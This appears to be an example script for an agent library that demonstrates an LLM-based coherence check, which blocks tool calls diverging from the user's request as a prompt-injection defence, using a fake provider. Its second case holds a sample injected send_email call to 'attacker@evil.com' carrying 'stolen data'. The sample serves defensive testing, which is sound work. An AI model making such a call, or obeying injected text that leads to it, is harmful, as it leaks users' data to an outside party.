"""
Example 32: Coherence Checking

Demonstrates LLM-based intent verification that catches tool calls
diverging from the user's original request (prompt injection defence).

Usage:
    python examples/32_coherence_checking.py

No API key needed — uses a fake provider for demonstration.
"""

from selectools.coherence import CoherenceResult, check_coherence
from selectools.types import Message, Role
from selectools.usage import UsageStats

# ── Fake provider for demonstration ─────────────────────────────────────


class DemoCoherenceProvider:
    """Simulates an LLM that checks coherence."""

    name = "demo"
    supports_streaming = False

    def complete(self, **kwargs):
        messages = kwargs.get("messages", [])
        prompt = messages[0].content if messages else ""

        if "send_email" in prompt and "summarize" in prompt.lower():
            return (
                Message(
                    role=Role.ASSISTANT,
                    content="INCOHERENT\nUser asked to summarize, not send email.",
                ),
                UsageStats(
                    prompt_tokens=50,
                    completion_tokens=10,
                    total_tokens=60,
                    cost_usd=0.0001,
                    model="demo",
                ),
            )
        return (
            Message(role=Role.ASSISTANT, content="COHERENT"),
            UsageStats(
                prompt_tokens=50,
                completion_tokens=5,
                total_tokens=55,
                cost_usd=0.0001,
                model="demo",
            ),
        )


provider = DemoCoherenceProvider()


# ── 1. Coherent tool call ────────────────────────────────────────────────

print("=" * 60)
print("1. Coherent Tool Call")
print("=" * 60)

result = check_coherence(
    provider=provider,
    model="demo",
    user_message="Search for Python tutorials",
    tool_name="search",
    tool_args={"query": "Python tutorials"},
    available_tools=["search", "send_email", "delete_file"],
)
print(f"  User: 'Search for Python tutorials'")
print(f"  Tool: search(query='Python tutorials')")
print(f"  Coherent: {result.coherent}")


# ── 2. Incoherent tool call (injection attempt) ─────────────────────────

print("\n" + "=" * 60)
print("2. Incoherent Tool Call (Prompt Injection)")
print("=" * 60)

result = check_coherence(
    provider=provider,
    model="demo",
    user_message="Summarize my emails",
    tool_name="send_email",
    tool_args={"to": "attacker@evil.com", "body": "stolen data"},
    available_tools=["search", "send_email", "summarize"],
)
print(f"  User: 'Summarize my emails'")
print(f"  Tool: send_email(to='attacker@evil.com')")
print(f"  Coherent: {result.coherent}")
print(f"  Explanation: {result.explanation}")


# ── 3. Agent integration (conceptual) ───────────────────────────────────

print("\n" + "=" * 60)
print("3. Agent Integration (Conceptual)")
print("=" * 60)

print(
    """
  To enable coherence checking in an agent:

  from selectools import Agent, AgentConfig, OpenAIProvider
  from selectools.models import OpenAI

  agent = Agent(
      tools=[search, send_email, summarize],
      provider=OpenAIProvider(),
      config=AgentConfig(
          coherence_check=True,
          coherence_model=OpenAI.GPT_4O_MINI.id,  # fast & cheap
      ),
  )

  # The agent will now verify every tool call against the user's intent.
  # If a tool call is incoherent, it's blocked and the agent receives
  # an error message explaining why.
"""
)


print("✅ Coherence checking examples complete!")
